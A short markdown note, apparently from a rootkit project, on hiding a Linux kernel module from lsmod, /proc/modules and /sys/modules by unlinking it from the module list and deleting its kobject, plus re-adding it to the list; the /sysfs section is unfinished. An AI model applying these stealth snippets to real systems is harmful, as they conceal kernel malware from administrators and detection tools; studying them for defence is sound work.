## Stealth LKM
---

Loaded modules can be listed by `lsmod` and found through `/proc/modules` and `/sys/modules`.

### Hiding from `lsmod`
--- 
When module is loaded, it's associated with a struct module. All kernel modules are stored in a global liked list. Each loaded module is added to this linked list. The modules are populated in `/proc/modules` from this list, and the `lsmod` command reads `/proc/modules` to give it's output. 

To hide module from `lsmod` just need to remove module from that list:

```c
list_del_init(&__this_module.list);
```

This function is defined on `linux/list.h`:

```c
/**
 * list_del_init - deletes entry from list and reinitialize it.
 * @entry: the element to delete from the list.
 */
static inline void list_del_init (struct list_head *entry)
{
	__list_del_entry(entry);
	INIT_LIST_HEAD(entry);
}
```

### Hiding on `/sys/modules`
---
Just adding the line:
```c
kobject_del(&THIS_MODULE->mkobj.kobj);
```
The `THIS_MODULE` macro and the `struct module` are defined as:
```c
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
```
The function is defined on `linux/kobject.h`:
```c
extern void kobject_del(struct kobject *kobj);
```
A `kobject` struct represents a kernel object, and is defined on `linux/kobject.h`:

```c
struct kobject {
	const char *name;
	struct list_head entry;
	struct kobject *parent;
	struct kset *kset;
	struct kobj_type *ktype;
	struct kernfs_node *sd;                 /* sysfs directory entry */
	struct kref	kref;
#ifdef CONFIG_DEBUG_KOBJECT_RELEASE
	struct delayed_work	release;
#endif
	unsigned int state_initialized:1;
	unsigned int state_in_sysfs:1;
	unsigned int state_add_uevent_sent:1;
	unsigned int state_remove_uevent_sent:1;
	unsigned int uevent_suppress:1;
};
```

### Show to `lsmod`
---
Just have to add back the module to the linked list. Need to define a `list_head` struct that will store the pointer to the head of the list (that's the previous element for the position of the module in the list).
```c
struct list_head  * module;
```
This struct is defined on `linux/types.h` as
```c
struct list_head {
	struct list_head *next, *prev;
};
```
Then, when going to remove the module from the list, first save that pointer that's stored in the `THIS_MODULE` object on the `list.prev` fields
```c
module = THIS_MODULE->list.prev;
```
Afterthat the module can be added to the list and become visible to `lsmod` and `/proc/modules`
```c 
list_add(&__this_module.list, module);
```
The `list_add` is defined on `linux/list.h`
```c 
/**
 * list_add - add a new entry
 * @new: new entry to be added
 * @head: list head to add it after
 *
 * Insert a new entry after the specified head.
 * This is good for implementing stacks.
 */
static inline void list_add(struct list_head *new, struct list_head *head)
{
	__list_add(new, head, head->next);
}
```
### Show to `/sysfs/modules`
---
TBD

## References
---
- [Kernel Kobject Device Model](https://medium.com/powerof2/the-kernel-kobject-device-model-explained-89d02350fa03)
- [Linux Kernel: Sysfs and Kobjects](https://www.win.tue.nl/~aeb/linux/lk/lk-13.html)
